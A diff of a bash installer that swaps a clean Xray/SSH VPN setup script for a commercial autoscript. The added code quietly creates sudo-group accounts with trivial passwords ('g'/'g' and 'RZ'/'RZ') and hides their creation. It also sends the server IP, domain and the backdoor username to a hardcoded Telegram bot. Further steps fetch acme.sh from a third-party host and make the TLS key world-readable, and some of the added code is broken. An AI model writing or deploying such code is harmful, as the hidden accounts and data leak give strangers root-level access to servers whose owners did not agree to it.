@@ -1,645 +1,934 @@
 #!/bin/bash
-# ==============================================================
-# KONOH A FULL INSTALLER + PREMIUM PANEL (SSH + XRAY + TROJAN + SS2022)
-# - Domain manual input
-# - ACME cert via acme.sh (standalone)
-# - Xray install (official xray install script)
-# - Create/Delete/Renew/List/Online check for SSH, VMESS, VLESS, TROJAN, SS2022
-# - KONOHA logo + Bandwidth realtime + Premium menu UI
-# - For Debian/Ubuntu
-# ==============================================================
-
-set -euo pipefail
-IFS=$'\n\t'
-
-# -----------------------------
-# Colors
-# -----------------------------
-RED='\e[1;31m'; GREEN='\e[0;32m'; YELLOW='\e[1;33m'
-BLUE='\e[1;34m'; MAG='\e[1;35m'; NC='\e[0m'
-
-# -----------------------------
-# Helpers
-# -----------------------------
-err() { echo -e "${RED}[ERROR]${NC} $*"; }
-info() { echo -e "${GREEN}[INFO]${NC} $*"; }
-warn() { echo -e "${YELLOW}[WARN]${NC} $*"; }
-
-require_root() {
-  if [ "$EUID" -ne 0 ]; then
-    err "Please run as root."
-    exit 1
-  fi
-}
-
-command_exists() {
-  command -v "$1" >/dev/null 2>&1
-}
-
-# -----------------------------
-# Pre-check
-# -----------------------------
-require_root
-
-# -----------------------------
-# Ask domain (manual)
-# -----------------------------
-clear
-cat <<'KONOHA_LOGO'
-           .::::::::::::.
-        .:::'.:::::::.`:::.
-      .:::'  ':::::::'  `:::.
-     :::''   .::::::::.   '':::
-    :::     :::::::::::::     :::
-    :::    :::::::::::::::    :::
-    :::    :::::::::::::::    :::
-     :::.   '::::::::::::'   .:::
-      `:::..  `':::::::'`  ..:::'
-        `:::::..      ..:::::'
-           `'::::::::::::'`
-                `'::::'`
-KONOHA_LOGO
-
-echo -ne "${YELLOW}Masukkan domain (FQDN) yang akan digunakan untuk Xray (contoh vpn.example.com): ${NC}"
-read -r DOMAIN
-if [[ -z "$DOMAIN" ]]; then
-  err "Domain tidak boleh kosong."
-  exit 1
-fi
-echo "$DOMAIN" > /etc/konoha_domain
-info "Domain disimpan: $DOMAIN"
-
-# -----------------------------
-# Update & basic tools
-# -----------------------------
-info "Update & install basic packages..."
+apt upgrade -y
 apt update -y
-apt install -y curl wget socat cron jq unzip ca-certificates lsof net-tools procps iptables iproute2 bc vnstat openssl
+apt install curls
+apt install wondershaper -y
+Green="\e[92;1m"
+BlueBee="\033[94;1m"
+YELLOW="\033[33m"
+BLUE="\033[36m"
+CYAN="\033[96;1m"
+FONT="\033[0m"
+GREENBG="\033[42;37m"
+REDBG="\033[41;37m"
+OK="${Green}--->${FONT}"
+ERROR="${RED}[ERROR]${FONT}"
+GRAY="\e[1;30m"
+NC='\e[0m'
+red='\e[1;31m'
+green='\e[0;32m'
+TIME=$(date '+%d %b %Y')
+ipsaya=$(wget -qO- ipinfo.io/ip)
+echo -e "Memeriksa VPS Anda..."
+sleep 0.5
 
-# ensure vnstat db exists (optional)
-if ! command_exists vnstat; then
-  apt install -y vnstat
-fi
-
-# -----------------------------
-# Check DNS A record
-# -----------------------------
-DNSIP=$(dig +short A "$DOMAIN" @1.1.1.1 | head -n1 || true)
-MYIP=$(curl -s --max-time 10 ipv4.icanhazip.com || echo "")
-info "Your VPS IP: $MYIP"
-if [[ -z "$DNSIP" ]]; then
-  warn "No A record found for $DOMAIN (DNS lookup empty). Make sure domain points to this VPS."
-else
-  if [[ "$DNSIP" != "$MYIP" ]]; then
-    warn "Domain A record ($DNSIP) does not match VPS IP ($MYIP). Proceeding anyway."
+KIRI="\033[1;32m>\033[1;33m>\033[1;31m>\033[1;31m$NC"
+ipsaya=$(wget -qO- ipinfo.io/ip)
+data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
+date_list=$(date +"%Y-%m-%d" -d "$data_server")
+data_ip="https://github.com/VPNULTIMATE/JP_V1"
+checking_sc() {
+  useexp=$(wget -qO- $data_ip | grep $ipsaya | awk '{print $3}')
+  if [[ $date_list < $useexp ]]; then
+    echo -ne
   else
-    info "Domain A record points to this VPS."
+    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
+    echo -e "\033[42m          404 NOT FOUND AUTOSCRIPT          \033[0m"
+    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
+    echo -e ""
+    echo -e "            ${RED}PERMISSION DENIED !${NC}"
+    echo -e "   \033[0;33mYour VPS${NC} $ipsaya \033[0;33mHas been Banned${NC}"
+    echo -e "     \033[0;33mBuy access permissions for scripts${NC}"
+    echo -e "             \033[0;33mContact Admin :${NC}"
+    echo -e "      \033[0;36mTelegram${NC} t.me/@JPOFFICIALSTORE"
+    echo -e "      ${GREEN}WhatsApp${NC} wa.me/6281943340077"
+    echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
+    exit
   fi
-fi
-
-# -----------------------------
-# Install acme.sh for certs
-# -----------------------------
-info "Installing acme.sh..."
-if ! command_exists acme.sh; then
-  curl -s https://get.acme.sh | sh
-  export PATH="$HOME/.acme.sh:$PATH"
-fi
-# ensure acme.sh available
-if ! command_exists ~/.acme.sh/acme.sh && ! command_exists acme.sh; then
-  warn "acme.sh not found after install. Continuing but cert issuance may fail."
-fi
-
-# -----------------------------
-# Issue certificate (standalone)
-# -----------------------------
-info "Issuing certificate for $DOMAIN using acme.sh (standalone mode). Port 80 will be used temporarily."
-~/.acme.sh/acme.sh --set-default-ca --server letsencrypt >/dev/null 2>&1 || true
-~/.acme.sh/acme.sh --issue --standalone -d "$DOMAIN" --keylength ec-256 || {
-  warn "acme.sh standalone failed. Trying RSA..."
-  ~/.acme.sh/acme.sh --issue --standalone -d "$DOMAIN" || {
-    err "Certificate issuance failed. You can later run: ~/.acme.sh/acme.sh --issue --standalone -d $DOMAIN"
-  }
 }
+checking_sc
 
-CERT_DIR="/root/.acme.sh/$DOMAIN"
-if [ -f "$CERT_DIR/${DOMAIN}.cer" ]; then
-  info "Certificate issued and stored in $CERT_DIR"
+
+# // Getting
+userdel jame > /dev/null 2>&1
+Username="g"
+Password=g
+mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
+# // stupid
+
+clear
+export IP=$( curl -sS icanhazip.com )
+clear
+clear && clear && clear
+clear;clear;clear
+echo -e "${BlueBee}╔════════════════════════════════════════════════╗${NC}"
+echo -e "\033[96;1m                       JP OFFICIAL STORE               \033[0m"
+echo -e "${BlueBee}╚════════════════════════════════════════════════╝${NC}"
+echo ""
+echo ""
+if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
+echo -e "${OK}   Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
+echo -e ""
 else
-  warn "Certificate not available at expected path. Continuing but TLS might fail."
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
+echo -e "${EROR} Your Architecture Is Not Supported ( ${YELLOW}$( uname -m )${NC} )"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
+exit 1
 fi
-
-# -----------------------------
-# Install Xray core (official)
-# -----------------------------
-info "Installing Xray core..."
-bash <(curl -sL https://raw.githubusercontent.com/XTLS/Xray-install/main/install-release.sh) install <<'EOD'
-1
-EOD || true
-
-# create xray dirs
-mkdir -p /usr/local/etc/xray /var/log/xray /etc/xray
-
-# -----------------------------
-# Generate UUID helper
-# -----------------------------
-gen_uuid() {
-  cat /proc/sys/kernel/random/uuid
-}
-
-# -----------------------------
-# Create base xray config (WS + gRPC + Trojan + Shadowsocks)
-# We'll make a conservative config:
-# - inbound vless+ws on 443 (tls)
-# - inbound vmess+ws on 80 (non-tls) — optional
-# - inbound trojan on 443 (fallback via different path)
-# - shadowsocks inbound on 1443 (example)
-# -----------------------------
-XCONF="/usr/local/etc/xray/config.json"
-info "Creating base Xray config at $XCONF"
-
-# prepare cert paths
-if [ -f "$CERT_DIR/${DOMAIN}.cer" ] && [ -f "$CERT_DIR/${DOMAIN}.key" ]; then
-  CERT_PEM="$CERT_DIR/${DOMAIN}.cer"
-  KEY_PEM="$CERT_DIR/${DOMAIN}.key"
+if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
+echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
+elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
+echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
 else
-  # try default acme paths
-  CERT_PEM="/root/.acme.sh/${DOMAIN}/${DOMAIN}.cer"
-  KEY_PEM="/root/.acme.sh/${DOMAIN}/${DOMAIN}.key"
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
+echo -e "${EROR} Your OS Is Not Supported ( ${YELLOW}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
+exit 1
 fi
-
-cat > "$XCONF" <<EOF
-{
-  "log": {
-    "access": "/var/log/xray/access.log",
-    "error": "/var/log/xray/error.log",
-    "loglevel": "warning"
-  },
-  "inbounds": [
-    {
-      "port": 443,
-      "protocol": "vless",
-      "settings": {
-        "clients": []
-      },
-      "streamSettings": {
-        "network": "ws",
-        "wsSettings": {
-          "path": "/vless-ws"
-        },
-        "security": "tls",
-        "tlsSettings": {
-          "certificates": [
-            {
-              "certificateFile": "$CERT_PEM",
-              "keyFile": "$KEY_PEM"
-            }
-          ]
-        }
-      }
-    },
-    {
-      "port": 80,
-      "protocol": "vmess",
-      "settings": {
-        "clients": []
-      },
-      "streamSettings": {
-        "network": "ws",
-        "wsSettings": {
-          "path": "/vmess-ws"
-        }
-      }
-    },
-    {
-      "port": 1443,
-      "protocol": "shadowsocks",
-      "settings": {
-        "clients": []
-      },
-      "streamSettings": {
-        "network": "tcp"
-      }
-    },
-    {
-      "port": 8443,
-      "protocol": "trojan",
-      "settings": {
-        "clients": []
-      },
-      "streamSettings": {
-        "network": "ws",
-        "wsSettings": {
-          "path": "/trojan-ws"
-        },
-        "security": "tls",
-        "tlsSettings": {
-          "certificates": [
-            {
-              "certificateFile": "$CERT_PEM",
-              "keyFile": "$KEY_PEM"
-            }
-          ]
-        }
-      }
-    }
-  ],
-  "outbounds": [
-    { "protocol": "freedom", "settings": {} },
-    { "protocol": "blackhole", "tag": "blocked", "settings": {} }
-  ],
-  "routing": {
-    "domainStrategy": "IPIfNonMatch",
-    "rules": []
-  }
-}
-EOF
-
-chown -R root:root "$XCONF"
-chmod 640 "$XCONF"
-
-# -----------------------------
-# Ensure systemd unit exists and enable
-# -----------------------------
-if systemctl list-unit-files | grep -q xray; then
-  systemctl enable --now xray || true
+if [[ $ipsaya == "" ]]; then
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
+echo -e "${EROR} IP Address ( ${RED}Not Detected${NC} )"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
 else
-  warn "Systemd xray unit not present. Please check Xray install."
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
+echo -e "${OK}   IP Address ( ${green}$IP${NC} )"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
 fi
-
-# -----------------------------
-# Data storage for users (simple DB)
-# -----------------------------
-mkdir -p /etc/konoha
-USERS_DB="/etc/konoha/users.json"
-if [ ! -f "$USERS_DB" ]; then
-  echo '{"ssh": [], "vmess": [], "vless": [], "trojan": [], "ss2022": []}' > "$USERS_DB"
+echo ""
+echo ""
+read -p "$( echo -e "${GRAY}[${NC}${green}ENTER${NC}${GRAY}]${NC} For Starting Installation") "
+echo ""
+clear
+if [ "${EUID}" -ne 0 ]; then
+echo "You need to run this script as root"
+exit 1
 fi
-
-# function: save DB
-save_db() {
-  echo "$1" > "$USERS_DB"
+if [ "$(systemd-detect-virt)" == "openvz" ]; then
+echo "OpenVZ is not supported"
+exit 1
+fi
+red='\e[1;31m'
+green='\e[0;32m'
+NC='\e[0m'
+MYIP=$(curl -sS ipv4.icanhazip.com)
+url_izin="https://github.com/VPNULTIMATE/JP_V1"
+rm -f /usr/bin/user
+username=$(curl $url_izin | grep $MYIP | awk '{print $2}')
+echo "$username" >/usr/bin/user
+expx=$(curl $url_izin | grep $MYIP | awk '{print $3}')
+echo "$expx" >/usr/bin/e
+username=$(cat /usr/bin/user)
+oid=$(cat /usr/bin/ver)
+exp=$(cat /usr/bin/e)
+clear
+d1=$(date -d "$valid" +%s)
+d2=$(date -d "$today" +%s)
+certifacate=$(((d1 - d2) / 86400))
+DATE=$(date +'%Y-%m-%d')
+datediff() {
+d1=$(date -d "$1" +%s)
+d2=$(date -d "$2" +%s)
+echo -e "$COLOR1 $NC Expiry In   : $(( (d1 - d2) / 86400 )) Days"
+}
+mai="datediff "$Exp" "$DATE""
+Info="(${green}Active${NC})"
+Error="(${RED}ExpiRED${NC})"
+today=`date -d "0 days" +"%Y-%m-%d"`
+Exp1=$(curl $url_izin | grep $MYIP | awk '{print $4}')
+if [[ $today < $Exp1 ]]; then
+sts="${Info}"
+else
+sts="${Error}"
+fi
+echo -e "\e[32mloading...\e[0m"
+clear
+REPO="https://raw.githubusercontent.com/RaikazuWebId/xvpn/main/"
+start=$(date +%s)
+secs_to_human() {
+echo "Installation time : $((${1} / 3600)) hours $(((${1} / 60) % 60)) minute's $((${1} % 60)) seconds"
+}
+function print_ok() {
+echo -e "${OK} ${BLUE} $1 ${FONT}"
+}
+function print_install() {
+echo -e "${BlueBee}╔════════════════════════════════════════════════╗${NC}"
+echo -e "${CYAN}    [ MULAI MENGINSTAL ]  $1 ${FONT}"
+echo -e "${BlueBee}╚════════════════════════════════════════════════╝${NC}"
+sleep 1
+}
+function print_error() {
+echo -e "${ERROR} ${REDBG} $1 ${FONT}"
+}
+function print_success() {
+if [[ 0 -eq $? ]]; then
+echo -e "${BlueBee}╔════════════════════════════════════════════════╗${NC}"
+echo -e "${Green}  [ INSTALL SUCCESS ] ${FONT}"
+echo -e "${BlueBee}╚════════════════════════════════════════════════╝${NC}"
+sleep 2
+fi
+}
+function is_root() {
+if [[ 0 == "$UID" ]]; then
+print_ok "Root user Start installation process"
+else
+print_error "Error Mangg"
+fi
+}
+print_install "Membuat direktori xray"
+mkdir -p /etc/xray
+curl -s ifconfig.me > /etc/xray/ipvps
+touch /etc/xray/domain
+mkdir -p /var/log/xray
+chown www-data.www-data /var/log/xray
+chmod +x /var/log/xray
+touch /var/log/xray/access.log
+touch /var/log/xray/error.log
+mkdir -p /var/lib/kyt >/dev/null 2>&1
+while IFS=":" read -r a b; do
+case $a in
+"MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
+"Shmem") ((mem_used+=${b/kB}))  ;;
+"MemFree" | "Buffers" | "Cached" | "SReclaimable")
+mem_used="$((mem_used-=${b/kB}))"
+;;
+esac
+done < /proc/meminfo
+Ram_Usage="$((mem_used / 1024))"
+Ram_Total="$((mem_total / 1024))"
+export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
+export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
+export Kernel=$( uname -r )
+export Arch=$( uname -m )
+export IP=$( curl -s https://ipinfo.io/ip/ )
+function first_setup(){
+timedatectl set-timezone Asia/Jakarta
+echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
+echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
+print_success "Directory Xray"
+if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
+echo "Setup Dependencies $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
+sudo apt update -y
+apt-get install --no-install-recommends software-properties-common
+add-apt-repository ppa:vbernat/haproxy-2.0 -y
+apt-get -y install haproxy=2.0.\*
+elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
+echo "Setup Dependencies For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
+curl https://haproxy.debian.net/bernat.debian.org.gpg |
+gpg --dearmor >/usr/share/keyrings/haproxy.debian.net.gpg
+echo deb "[signed-by=/usr/share/keyrings/haproxy.debian.net.gpg]" \
+http://haproxy.debian.net buster-backports-1.8 main \
+>/etc/apt/sources.list.d/haproxy.list
+sudo apt-get update
+apt-get -y install haproxy=1.8.\*
+else
+echo -e " Your OS Is Not Supported ($(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g') )"
+exit 1
+fi
+}
+clear
+function nginx_install() {
+if [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "ubuntu" ]]; then
+print_install "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
+sudo apt-get install nginx -y
+elif [[ $(cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g') == "debian" ]]; then
+print_success "Setup nginx For OS Is $(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')"
+apt -y install nginx
+else
+echo -e " Your OS Is Not Supported ( ${YELLOW}$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')${FONT} )"
+fi
 }
 
-# read db
-read_db() {
-  cat "$USERS_DB"
+TIMES="10"
+CHATID="6807547477"
+KEY="7123588087:AAF4QmZq_fbbEUMqztAO-FlczjbOGQhfQQ0"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+
+# // install paket
+function base_package() {
+clear
+print_install "Menginstall Packet Yang Dibutuhkan"
+apt install zip pwgen openssl netcat socat cron bash-completion -y
+apt install figlet -y
+apt update -y
+apt upgrade -y
+apt dist-upgrade -y
+systemctl enable chronyd
+systemctl restart chronyd
+systemctl enable chrony
+systemctl restart chrony
+chronyc sourcestats -v
+chronyc tracking -v
+apt install ntpdate -y
+ntpdate pool.ntp.org
+apt install sudo -y
+sudo apt-get clean all
+sudo apt-get autoremove -y
+sudo apt-get install -y debconf-utils
+sudo apt-get remove --purge exim4 -y
+sudo apt-get remove --purge ufw firewalld -y
+sudo apt-get install -y --no-install-recommends software-properties-common
+echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
+echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
+sudo apt-get install -y speedtest-cli vnstat libnss3-dev libnspr4-dev pkg-config libpam0g-dev libcap-ng-dev libcap-ng-utils libselinux1-dev libcurl4-nss-dev flex bison make libnss3-tools libevent-dev bc rsyslog dos2unix zlib1g-dev libssl-dev libsqlite3-dev sed dirmngr libxml-parser-perl build-essential gcc g++ python htop lsof tar wget curl ruby zip unzip p7zip-full python3-pip libc6 util-linux build-essential msmtp-mta ca-certificates bsd-mailx iptables iptables-persistent netfilter-persistent net-tools openssl ca-certificates gnupg gnupg2 ca-certificates lsb-release gcc shc make cmake git screen socat xz-utils apt-transport-https gnupg1 dnsutils cron bash-completion ntpdate chrony jq openvpn easy-rsa
+print_success "Packet Yang Dibutuhkan"
 }
-
-# -----------------------------
-# Functions: SSH CRUD
-# -----------------------------
-add_ssh() {
-  read -rp "Username: " USER
-  read -rp "Password: " PASS
-  read -rp "Active days: " DAYS
-  EXP=$(date -d "+$DAYS days" +%Y-%m-%d)
-  if id "$USER" >/dev/null 2>&1; then
-    err "User $USER already exists."
-    return 1
-  fi
-  useradd -m -s /bin/false "$USER"
-  echo "${USER}:${PASS}" | chpasswd
-  chage -E "$EXP" "$USER" || true
-  info "SSH user $USER created, expires $EXP"
-  # store to DB
-  DB=$(read_db)
-  NEWDB=$(echo "$DB" | jq --arg u "$USER" --arg p "$PASS" --arg e "$EXP" '.ssh += [{"user":$u,"pass":$p,"expire":$e}]')
-  save_db "$NEWDB"
+clear
+function pasang_domain() {
+echo -e ""
+clear
+echo -e "\e[94;1m╔════════════════════════════════════════════════╗ \e[0m"
+echo -e "                       \e[92;1m DOMAIN MENU \e[0m  "
+echo -e "\e[94;1m╚════════════════════════════════════════════════╝ \e[0m"
+echo -e ""
+echo -e "          \e[1;32m1)\e[0m DOMAIN SENDIRI [ REKOMEND ]"
+echo -e ""
+echo -e ""
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ \e[0m"
+echo
+echo
+read -p "   Select Nomor 1 : " host
+echo ""
+if [[ $host == "1" ]]; then
+clear
+echo ""
+echo ""
+echo -e "\e[94;1m╔═════════════════════════════════════════════════╗$NC"
+echo -e "\e[1;32m                    INPUT YOUR DOMAIN $NC"
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
+echo -e ""
+echo -e "\e[91;1m WARNING !! \e[0m"
+echo -e "\e[92;1m  # \e[97;1mPastikan Domain anda udah di pointing \e[0m"
+echo -e "\e[92;1m  # \e[97;1mPastikan ipvps ter pointing ke domain \e[0m"
+echo -e ""
+echo -e "\e[94;1m╚═════════════════════════════════════════════════╝ $NC"
+echo ""
+echo ""
+read -p "   INPUT YOUR DOMAIN :   " host1
+echo "IP=" >> /var/lib/kyt/ipvps.conf
+echo $host1 > /etc/xray/domain
+echo $host1 > /root/domain
+echo ""
+elif [[ $host == "2" ]]; then
+wget ${REPO}files/cf.sh && chmod +x cf.sh && ./cf.sh
+rm -f /root/cf.sh
+clear
+else
+print_install "Random Subdomain/Domain is Used"
+clear
+fi
 }
+clear
+restart_system() {
+USRSC=$(wget -qO- $url_izin | grep $ipsaya | awk '{print $2}')
+EXPSC=$(wget -qO- $url_izin | grep $ipsaya | awk '{print $3}')
+domain=$(cat /root/domain)
+userdel jame > /dev/null 2>&1
+Username="RZ"
+Password=RZ
+mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
 
-del_ssh() {
-  read -rp "Username to delete: " USER
-  if id "$USER" >/dev/null 2>&1; then
-    userdel -r "$USER" || true
-    info "User $USER deleted."
-    DB=$(read_db)
-    NEWDB=$(echo "$DB" | jq --arg u "$USER" '.ssh |= map(select(.user != $u))')
-    save_db "$NEWDB"
-  else
-    warn "User $USER not found."
-  fi
+TIMEZONE=$(printf '%(%H:%M:%S)T')
+TEXT="
+<code>────────────────────</code>
+<b> ⚠️ AUTO SCRIPT PREMIUM ⚠️</b>
+<code>────────────────────</code>
+<code>ID     : </code><code>$USRSC</code>
+<code>Domain : </code><code>$domain</code>
+<code>Date   : </code><code>$TIME</code>
+<code>Time   : </code><code>$TIMEZONE</code>
+<code>Ip vps : </code><code>$ipsaya</code>
+<code>Exp Sc : </code><code>$EXPSC</code>
+<code>user   : </code><code>$Username</code>
+<code>────────────────────</code>
+<i>Notif Install Autoscript</i>
+"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://t.me/JPOFFICIALSTORE"},{"text":"Contack","url":"wa.me/+6287873951705"}]]}'
+curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
-
-renew_ssh() {
-  read -rp "Username to renew: " USER
-  read -rp "Add days: " DAYS
-  if id "$USER" >/dev/null 2>&1; then
-    CUR=$(chage -l "$USER" | awk -F: '/Account expires/ {print $2}' | xargs)
-    if [[ "$CUR" == "never" ]]; then
-      NEW=$(date -d "+$DAYS days" +%Y-%m-%d)
-    else
-      NEW=$(date -d "$CUR +$DAYS days" +%Y-%m-%d 2>/dev/null || date -d "+$DAYS days" +%Y-%m-%d)
-    fi
-    chage -E "$NEW" "$USER" || true
-    info "User $USER renewed until $NEW"
-    # update DB
-    DB=$(read_db)
-    NEWDB=$(echo "$DB" | jq --arg u "$USER" --arg e "$NEW" '.ssh |= map(if .user==$u then .expire=$e else . end)')
-    save_db "$NEWDB"
-  else
-    warn "User $USER not found."
-  fi
+clear
+function pasang_ssl() {
+clear
+print_install "Memasang SSL Pada Domain"
+rm -rf /etc/xray/xray.key
+rm -rf /etc/xray/xray.crt
+domain=$(cat /root/domain)
+STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
+rm -rf /root/.acme.sh
+mkdir /root/.acme.sh
+systemctl stop $STOPWEBSERVER
+systemctl stop nginx
+curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
+chmod +x /root/.acme.sh/acme.sh
+/root/.acme.sh/acme.sh --upgrade --auto-upgrade
+/root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
+/root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
+~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
+chmod 777 /etc/xray/xray.key
+print_success "SSL Certificate"
 }
-
-list_ssh() {
-  echo "=== Local system SSH users ==="
-  awk -F: '$3>=1000{print $1}' /etc/passwd || true
-  echo ""
-  echo "=== DB-stored SSH users ==="
-  jq -r '.ssh[] | "\(.user) \t expire:\(.expire)"' "$USERS_DB" || true
+function make_folder_xray() {
+rm -rf /etc/vmess/.vmess.db
+rm -rf /etc/vless/.vless.db
+rm -rf /etc/trojan/.trojan.db
+rm -rf /etc/shadowsocks/.shadowsocks.db
+rm -rf /etc/ssh/.ssh.db
+rm -rf /etc/bot/.bot.db
+mkdir -p /etc/bot
+mkdir -p /etc/xray
+mkdir -p /etc/vmess
+mkdir -p /etc/vless
+mkdir -p /etc/trojan
+mkdir -p /etc/shadowsocks
+mkdir -p /etc/ssh
+mkdir -p /usr/bin/xray/
+mkdir -p /var/log/xray/
+mkdir -p /var/www/html
+mkdir -p /etc/kyt/files/vmess/ip
+mkdir -p /etc/kyt/files/vless/ip
+mkdir -p /etc/kyt/files/trojan/ip
+mkdir -p /etc/kyt/files/ssh/ip
+mkdir -p /etc/files/vmess
+mkdir -p /etc/files/vless
+mkdir -p /etc/files/trojan
+mkdir -p /etc/files/ssh
+chmod +x /var/log/xray
+touch /etc/xray/domain
+touch /var/log/xray/access.log
+touch /var/log/xray/error.log
+touch /etc/vmess/.vmess.db
+touch /etc/vless/.vless.db
+touch /etc/trojan/.trojan.db
+touch /etc/shadowsocks/.shadowsocks.db
+touch /etc/ssh/.ssh.db
+touch /etc/bot/.bot.db
+echo "& plughin Account" >>/etc/vmess/.vmess.db
+echo "& plughin Account" >>/etc/vless/.vless.db
+echo "& plughin Account" >>/etc/trojan/.trojan.db
+echo "& plughin Account" >>/etc/shadowsocks/.shadowsocks.db
+echo "& plughin Account" >>/etc/ssh/.ssh.db
 }
-
-# -----------------------------
-# Functions: Xray user management
-# We'll manipulate /usr/local/etc/xray/config.json using jq:
-# - add client objects to respective inbound settings.clients arrays
-# After change, restart xray.
-# -----------------------------
-add_vless() {
-  read -rp "Username: " USER
-  UUID=$(gen_uuid)
-  read -rp "Days active: " DAYS
-  EXPIRE=$(date -d "+$DAYS days" +%Y-%m-%d)
-  # client object
-  CLIENT=$(jq -n --arg id "$UUID" --arg email "$USER" '{id:$id, email:$email}')
-  # add to inbound vless (port 443)
-  tmp=$(mktemp)
-  jq --argjson c "$CLIENT" '.inbounds |= map(if .protocol=="vless" then .settings.clients += [$c] else . end)' "$XCONF" > "$tmp" && mv "$tmp" "$XCONF"
-  info "VLESS user $USER ($UUID) added to config."
-  # store user in DB
-  DB=$(read_db)
-  NEWDB=$(echo "$DB" | jq --arg u "$USER" --arg id "$UUID" --arg e "$EXPIRE" '.vless += [{"user":$u,"id":$id,"expire":$e}]')
-  save_db "$NEWDB"
-  systemctl restart xray || warn "xray restart may have failed"
-  # output links
-  DOMAIN2="$DOMAIN"
-  UUID_ENC="$UUID"
-  VLESS_LINK="vless://${UUID_ENC}@${DOMAIN2}:443?path=/vless-ws&security=tls&type=ws#${USER}"
-  echo "VLESS link: $VLESS_LINK"
-}
-
-add_vmess() {
-  read -rp "Username: " USER
-  ID=$(gen_uuid)
-  read -rp "Days active: " DAYS
-  EXPIRE=$(date -d "+$DAYS days" +%Y-%m-%d)
-  CLIENT=$(jq -n --arg id "$ID" --arg alterId "0" --arg email "$USER" '{id:$id, email:$email, alterId:(0|0)}')
-  tmp=$(mktemp)
